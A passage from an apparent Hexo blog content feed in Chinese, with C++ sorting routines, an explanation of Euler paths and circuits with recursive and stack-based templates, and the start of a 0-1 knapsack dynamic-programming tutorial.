class="number">1</span>]);</span><br><span class="line">flag = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag == <span class="literal">false</span>) &#123;<span class="comment">//无交换，表已经有序 </span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//快速排序——用arr[low]将子表划分</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">partition</span><span class="params">(<span class="keyword">int</span> low, <span class="keyword">int</span> high)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> pivot = arr[low];<span class="comment">//第一个元素作为枢轴元素 </span></span><br><span class="line"><span class="keyword">while</span> (low &lt; high) &#123;<span class="comment">//用low、high搜索枢轴的最终位置 </span></span><br><span class="line"><span class="keyword">while</span> (low &lt; high &amp;&amp; arr[high] &gt;= pivot) &#123;</span><br><span class="line">high--;</span><br><span class="line">&#125; </span><br><span class="line">arr[low] = arr[high];<span class="comment">//比枢轴小的元素移动到左边 </span></span><br><span class="line"><span class="keyword">while</span> (low &lt; high &amp;&amp; arr[low] &lt;= pivot) &#123;</span><br><span class="line">low++;</span><br><span class="line">&#125; </span><br><span class="line">arr[high] = arr[low];<span class="comment">//比枢轴大的元素移动到左边 </span></span><br><span class="line">&#125;</span><br><span class="line">arr[low] = pivot;<span class="comment">//枢轴元素存放的最终位置</span></span><br><span class="line"><span class="keyword">return</span> low;<span class="comment">//返回存放枢轴的最终位置 </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//快速排序</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quck_sort</span><span class="params">(<span class="keyword">int</span> low, <span class="keyword">int</span> high)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (low &lt; high) &#123;</span><br><span class="line"><span class="keyword">int</span> pivot_pos = partition(low, high);</span><br><span class="line">quck_sort(low, pivot_pos - <span class="number">1</span>);</span><br><span class="line">quck_sort(pivot_pos + <span class="number">1</span>, high);</span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//简单选择排序</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">select_sort</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n - <span class="number">1</span>; i++) &#123;<span class="comment">//进行n-1趟 </span></span><br><span class="line"><span class="keyword">int</span> mini = i;<span class="comment">//记录最小元素位置 </span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt;= n; j++) &#123;<span class="comment">//在arr[i+1...n]中选择最小元素 </span></span><br><span class="line"><span class="keyword">if</span> (arr[j] &lt; arr[mini]) &#123;</span><br><span class="line">mini = j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (mini != i) &#123;</span><br><span class="line">swap(arr[i], arr[mini]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//堆排序——将以 k 为根的子树调整为大根堆</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">heap_adjust</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">arr[<span class="number">0</span>] = arr[k];<span class="comment">//arr[0]暂存子树的根节点 </span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span> * k; i &lt;= len; i *= <span class="number">2</span>) &#123;<span class="comment">//沿key较大的子节点向下筛选 </span></span><br><span class="line"><span class="keyword">if</span> (i &lt; len &amp;&amp; arr[i] &lt; arr[i + <span class="number">1</span>]) &#123;<span class="comment">//比较左右孩子结点大小 </span></span><br><span class="line">i++;<span class="comment">//取key较大的子节点下标 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (arr[<span class="number">0</span>] &gt;= arr[i]) &#123;<span class="comment">//筛选结束 </span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">arr[k] = arr[i];<span class="comment">//将arr[i]调整到双亲结点上 </span></span><br><span class="line">k = i;<span class="comment">//修改k，以便继续向下筛选 </span></span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">arr[k] = arr[<span class="number">0</span>];<span class="comment">//被筛选节点的值放入最终位置 </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//堆排序——建立大根堆</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build_max_heap</span><span class="params">(<span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = len / <span class="number">2</span>; i &gt; <span class="number">0</span>; i--) &#123;<span class="comment">//从后往前调整非终端结点 </span></span><br><span class="line">heap_adjust(i, len);</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//堆排序</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">heap_sort</span><span class="params">()</span> </span>&#123;</span><br><span class="line">build_max_heap(n);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt; <span class="number">1</span>; i--) &#123;</span><br><span class="line">swap(arr[i], arr[<span class="number">1</span>]);</span><br><span class="line">heap_adjust(<span class="number">1</span>, i - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> *b = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(n * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));<span class="comment">//辅助数组 </span></span><br><span class="line"><span class="comment">//归并排序——arr[low...mid]与arr[mid+1...high]各自有序，将两者合并</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span> low, <span class="keyword">int</span> mid, <span class="keyword">int</span> high)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j, k;</span><br><span class="line"><span class="keyword">for</span> (k = low; k &lt;= high; k++) &#123;<span class="comment">//将arr中所有元素复制到b </span></span><br><span class="line">b[k] = arr[k];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//合并 </span></span><br><span class="line"><span class="keyword">for</span> (i = low, j = mid + <span class="number">1</span>, k = low; i &lt;= mid &amp;&amp; j &lt;= high; k++) &#123;</span><br><span class="line"><span class="keyword">if</span> (b[i] &lt; b[j]) &#123;</span><br><span class="line">arr[k] = b[i++];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">arr[k] = b[j++];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//没有归并完的部分复制到尾部 </span></span><br><span class="line"><span class="keyword">while</span> (i &lt;= mid) arr[k++] = b[i++];</span><br><span class="line"><span class="keyword">while</span> (j &lt;= high) arr[k++] = b[j++]; </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//归并排序</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge_sort</span><span class="params">(<span class="keyword">int</span> low, <span class="keyword">int</span> high)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (low &lt; high) &#123;</span><br><span class="line"><span class="keyword">int</span> mid = (low + high) / <span class="number">2</span>;<span class="comment">//从中间拆开 </span></span><br><span class="line">merge_sort(low, mid);<span class="comment">//对左半部分归并排序 </span></span><br><span class="line">merge_sort(mid + <span class="number">1</span>, high);<span class="comment">//对右半部分归并排序 </span></span><br><span class="line">merge(low, mid, high);<span class="comment">//归并 </span></span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//cin&gt;&gt; n;</span></span><br><span class="line">n = <span class="number">8</span>;</span><br><span class="line">merge_sort(<span class="number">1</span>, n);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt; arr[i]&lt;&lt; <span class="string">" "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><ol><li></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>欧拉路</title>
      <link href="/2021/04/10/%E6%AC%A7%E6%8B%89%E8%B7%AF/"/>
      <url>/2021/04/10/%E6%AC%A7%E6%8B%89%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><ul><li><strong>欧拉回路</strong>：每条边只经过一次，而且回到起点</li><li><strong>欧拉路径</strong>：每条边只经过一次，不要求回到起点  </li><li><strong>欧拉回路判断</strong>：<ul><li><strong>无向图</strong>：连通(不考虑度为 0 的点)，没有奇度顶点</li><li><strong>有向图</strong>：强连通，每个顶点出度等于入度</li><li><strong>混合图(有无向边和有向边)</strong>：首先是基图连通(不考虑度为 0 的点)，然后需要借助网络流判定。<ol><li>首先给原图中的每条无向边随便指定一个方向（称为初始定向），将原图改为有向图 G’，然后的任务就是改变 G’ 中某些边的方向（当然是无向边转化来的，原混合图中的有向边不能动）使其满足每个点的入度等于出度。</li><li>设 $D[i]$ 为 $G’$ 中 (点 $i$ 的出度 - 点 $i $的入度）。可以发现，在改变 $G’$ 中边的方向的过程中，任何点的 $D$ 值的奇偶性都不会发生改变（设将边 $<i, j>$ 改为 $<j, i>$，则 $i $入度加 1 出度减 1，$j$ 入度减 1 出度加 1，两者之差加 2 或减 2，奇偶性不变）！而最终要求的是每个点的入度等于出度，即每个点的 $D$ 值都为 0，是偶数，故可得：若初始定向得到的 $G’$ 中任意一个点的$D$值是奇数，那么原图中一定不存在欧拉环！</j,></i,></li><li>若初始 $D$ 值都是偶数，则将 $G’$ 改装成网络：设立源点 $S$ 和汇点 $T$，对于每个 $D[i]&gt;0$ 的点$i$，连边 $<s, i>$，容量为 $D[i]/2$；对于每个 $D[j]<0$ 的点 $j$，连边 $<j, t>$，容量为 $-D[j]/2$； $G’$中的每条边在网络中仍保留，容量为 1（表示该边最多只能被改变方向一次）。求这个网络的最大流，若 $S$ 引出的所有边均满流，则原混合图是欧拉图，将网络中所有流量为 1 的中间边（就是不与 $S$ 或 $T$关联的边）在 $G’$ 中改变方向，形成的新图 $G”$ 一定是有向欧拉图；若 $S$ 引出的边中有的没有满流，则原混合图不是欧拉图。</0$></s,></li></ol></li></ul></li><li><strong>欧拉路径的判断</strong>：<ul><li><strong>无向图</strong>：连通(不考虑度为 0 的点)，没有奇度顶点或恰有两个奇度顶点</li><li><strong>有向图</strong>：基图连通(把边当成无向边，同样不考虑度为 0 的点)，每个顶点出度等于入度或<br>者有且仅有一个点的出度比入度多 1，有且仅有一个点的出度比入度少 1，其余出度等于入<br>度。</li><li><strong>混合图</strong>：如果存在欧拉回路，一定存在欧拉路径了。否则如果有且仅有两个点的（出度 -入<br>度）是奇数，那么给这个两个点加边，判断是否存在欧拉回路。  </li></ul></li></ul><p><a href="https://blog.csdn.net/richenyunqi/article/details/80382450/" target="_blank" rel="noopener">https://blog.csdn.net/richenyunqi/article/details/80382450/</a></p><h1 id="欧拉路径模板"><a href="#欧拉路径模板" class="headerlink" title="欧拉路径模板"></a>欧拉路径模板</h1><h2 id="1-递归"><a href="#1-递归" class="headerlink" title="1 递归"></a>1 递归</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//无向图的欧拉路径</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e4</span>+<span class="number">5</span>;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;graph[maxn],path;<span class="comment">//图、欧拉路径的倒序</span></span><br><span class="line"><span class="keyword">int</span> N, M;<span class="comment">//顶点数、边数</span></span><br><span class="line"><span class="keyword">bool</span> visit[maxn][maxn];<span class="comment">//表示边是否已被访问</span></span><br><span class="line"><span class="comment">//顶点v的度数是否为奇数</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">f</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp;v)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> v.size()%<span class="number">2</span>==<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//深度优先遍历</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> v)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;graph[v].size();++i)&#123;<span class="comment">//遍历该点能到达的结点</span></span><br><span class="line">        <span class="keyword">int</span> w=graph[v][i];</span><br><span class="line">        <span class="keyword">if</span>(!visit[v][w])&#123;<span class="comment">//该边没有被访问过</span></span><br><span class="line">            visit[v][w]=visit[w][v]=<span class="literal">true</span>;<span class="comment">//该边已被访问</span></span><br><span class="line">            DFS(w);<span class="comment">//递归遍历</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    path.push_back(v);<span class="comment">//加入欧拉路径中</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;N,&amp;M);<span class="comment">//输入点数、边数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;M;++i)&#123;<span class="comment">//输入边，无向图</span></span><br><span class="line">        <span class="keyword">int</span> a,b;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;a,&amp;b);</span><br><span class="line">        graph[a].push_back(b);</span><br><span class="line">        graph[b].push_back(a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=N;++i)<span class="comment">//排序、题目要求输出字典序最小的一种方案</span></span><br><span class="line">        sort(graph[i].begin(),graph[i].end());</span><br><span class="line">    DFS(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> k=count_if(graph+<span class="number">1</span>,graph+N+<span class="number">1</span>,f);<span class="comment">//度数为奇数的顶点个数</span></span><br><span class="line">    <span class="comment">//连通、没有奇度顶点或恰有两个奇度顶点且起点为奇度顶点</span></span><br><span class="line">    <span class="keyword">if</span>(path.size()==M+<span class="number">1</span>&amp;&amp;(k==<span class="number">0</span>||(k==<span class="number">2</span>&amp;&amp;f(graph[<span class="number">1</span>]))))</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=path.size()<span class="number">-1</span>;i&gt;=<span class="number">0</span>;--i)<span class="comment">//反向输出路径</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d "</span>,path[i]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"-1"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-非递归"><a href="#2-非递归" class="headerlink" title="2 非递归"></a>2 非递归</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//无向图的欧拉路径</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e4</span>+<span class="number">5</span>;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;graph[maxn],path;<span class="comment">//图、欧拉路径的倒序</span></span><br><span class="line"><span class="keyword">int</span> N, M;<span class="comment">//顶点数、边数</span></span><br><span class="line"><span class="keyword">bool</span> visit[maxn][maxn];<span class="comment">//表示边是否已被访问</span></span><br><span class="line"><span class="comment">//顶点v的度数是否为奇数</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">f</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp;v)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> v.size()%<span class="number">2</span>==<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;N,&amp;M);<span class="comment">//输入点数、边数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;M;++i)&#123;<span class="comment">//输入边，无向图</span></span><br><span class="line">        <span class="keyword">int</span> a,b;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;a,&amp;b);</span><br><span class="line">        graph[a].push_back(b);</span><br><span class="line">        graph[b].push_back(a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=N;++i)<span class="comment">//排序、题目要求输出字典序最小的一种方案</span></span><br><span class="line">        sort(graph[i].begin(),graph[i].end());</span><br><span class="line">    <span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt;s;</span><br><span class="line">    s.push(<span class="number">1</span>);<span class="comment">//1号顶点(起点)入栈</span></span><br><span class="line">    <span class="keyword">while</span>(!s.empty())&#123;</span><br><span class="line">        <span class="keyword">int</span> v=s.top(),i;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graph[v].size();++i)&#123;<span class="comment">//遍历该点能到达的结点</span></span><br><span class="line">            <span class="keyword">int</span> w=graph[v][i];</span><br><span class="line">            <span class="keyword">if</span>(!visit[v][w])&#123;<span class="comment">//该边没有被访问过</span></span><br><span class="line">                s.push(w);<span class="comment">//顶点w入栈</span></span><br><span class="line">                visit[v][w]=visit[w][v]=<span class="literal">true</span>;<span class="comment">//该边已被访问</span></span><br><span class="line">                <span class="keyword">break</span>;<span class="comment">//跳出循环</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i==graph[v].size())&#123;<span class="comment">//没有还未访问的边</span></span><br><span class="line">            path.push_back(v);<span class="comment">//顶点v加入欧拉序列</span></span><br><span class="line">            s.pop();<span class="comment">//出栈</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> k=count_if(graph+<span class="number">1</span>,graph+N+<span class="number">1</span>,f);<span class="comment">//度数为奇数的顶点个数</span></span><br><span class="line">    <span class="comment">//连通、没有奇度顶点或恰有两个奇度顶点且起点为奇度顶点</span></span><br><span class="line">    <span class="keyword">if</span>(path.size()==M+<span class="number">1</span>&amp;&amp;(k==<span class="number">0</span>||(k==<span class="number">2</span>&amp;&amp;f(graph[<span class="number">1</span>]))))</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> i=path.rbegin();i!=path.rend();++i)<span class="comment">//倒序输出</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d "</span>,*i);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"-1"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>背包dp</title>
      <link href="/2021/04/10/%E8%83%8C%E5%8C%85dp/"/>
      <url>/2021/04/10/%E8%83%8C%E5%8C%85dp/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>转载：<a href="https://www.cnblogs.com/jbelial/articles/2116074.html" target="_blank" rel="noopener">dd大牛的《背包九讲》</a>、<a href="https://www.kancloud.cn/kancloud/pack/70124" target="_blank" rel="noopener">背包问题九讲</a>、<a href="https://zhuanlan.zhihu.com/p/139368825" target="_blank" rel="noopener">知乎转载</a></p></blockquote><h1 id="P01-01背包"><a href="#P01-01背包" class="headerlink" title="P01: 01背包"></a>P01: 01背包</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>有N件物品和一个容量为V的背包。第i件物品的费用/体积是c[i]，价值是w[i]。求解将哪些物品装入背包可使这些物品的体积总和不超过背包容量，且价值总和最大。</p><h2 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h2><p>这是最基础的背包问题，特点是：每种物品仅有一件，可以选择放或不放。</p><p>用子问题定义状态：即$f[i][v]$表示前i件物品恰放入一个容量为v的背包可以获得的最大价值。则其状态转移方程便是：$f[i][v]=max{f[i-1][v],f[i-1][v-c[i]]+w[i]}$。</p><p>这个方程非常重要，基本上所有跟背包相关的问题的方程都是由它衍生出来的。所以有必要将它详细解释一下：“将前i件物品放入容量为v的背包中”这个子问题，若只考虑第i件物品的策略（放或不放），那么就可以转化为一个只牵扯前i-1件物品的问题。如果不放第i件物品，那么问题就转化为“前i-1件物品放入容量为v的背包中”；如果放第i件物品，那么问题就转化为“前i-1件物品放入剩下的容量为v-c[i]的背包中”，此时能获得的最大价值就是$f [i-1][v-c[i]]$再加上通过放入第i件物品获得的价值$w[i]$。</p><p>注意$f[i][v]$有意义当且仅当存在一个前i件物品的子集，其费用总和为v。所以按照这个方程递推完毕后，最终的答案并不一定是$f[N] [V]$，而是$f[N][0…V]$的最大值。如果将状态的定义中的“恰”字去掉，在转移方程中就要再加入一项$f[i][v-1]$，这样就可以保证$f[N] [V]$就是最后的答案。</p><h2 id="优化——空间复杂度"><a href="#优化——空间复杂度" class="headerlink" title="优化——空间复杂度"></a>优化——空间复杂度</h2><p>以上方法的时间和空间复杂度均为$O(N*V)$，其中时间复杂度基本已经不能再优化了，但空间复杂度却可以优化到$O(V)$。</p><p>先考虑上面讲的基本思路如何实现，肯定是有一个主循环$i=1…N$，每次算出来二维数组$f[i][0..V]$的所有值。那么，如果只用一个数组$f [0..V]$，能不能保证第$i$次循环结束后$f[v]$中表示的就是我们定义的状态$f[i][v]$呢？$f[i][v]$是由$f[i-1][v]$和$f[i-1] [v-c[i]]$两个子问题递推而来，能否保证在推$f[i][v]$时（也即在第$i$次主循环中推$f[v]$时）能够得到$f[i-1][v]$和$f[i-1][v -c[i]]$的值呢？事实上，这要求在每次主循环中我们以$v=V..0$的顺序推$f[v]$，这样才能保证推$f[v]$时$f[v-c[i]]$保存的是状态$f[i -1][v-c[i]]$的值。伪代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i=<span class="number">1.</span>.N</span><br><span class="line"><span class="keyword">for</span> v=V.<span class="number">.0</span></span><br><span class="line">f[v]=max&#123;f[v],f[v-c[i]]+w[i]&#125;;</span><br></pre></td></tr></table></figure><p>其中的$f[v]=max{f[v],f[v-c[i]]+w[i]}$一句恰就相当于我们的转移方程$f[i][v]=max{f[i-1][v],f[i- 1][v-c[i]]+w[i]}$，因为现在的$f[v-c[i]]$就相当于原来的$f[i-1][v-c[i]]$。如果将v的循环顺序从上面的逆序改成顺序的话，那么则成了$f[i][v]$由$f[i][v-c[i]]$推知，与本题意不符，但它却是另一个重要的背包问题P02最简捷的解决方案，故学习只用一维数组解01背包问题是十分必要的。</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e3</span> + <span class="number">5</span>;<span class="comment">//物品最大数量</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxv = <span class="number">1e3</span> + <span class="number">5</span>;<span class="comment">//背包最大体积</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> dp[maxv];<span class="comment">//背包</span></span><br><span class="line"><span class="keyword">int</span> volume[maxn], value[maxn];<span class="comment">//每个物品的体积和价值</span></span><br><span class="line"><span class="keyword">int</span> n, v;<span class="comment">//总物品数、背包体积</span></span><br><span class="line"><span class="comment">//01背包 每种物品仅有一件，可以选择放或不放</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">zero_one_park</span><span class="params">(<span class="keyword">int</span> val, <span class="keyword">int</span> vol)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = v; j &gt;= vol; j--) &#123;</span><br><span class="line">        dp[j] = max(dp[j], dp[j - vol] + val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt; n&gt;&gt; v;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt; volume[i]&gt;&gt; value[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        zero_one_park(value[i], volume[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt; dp[v]&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span 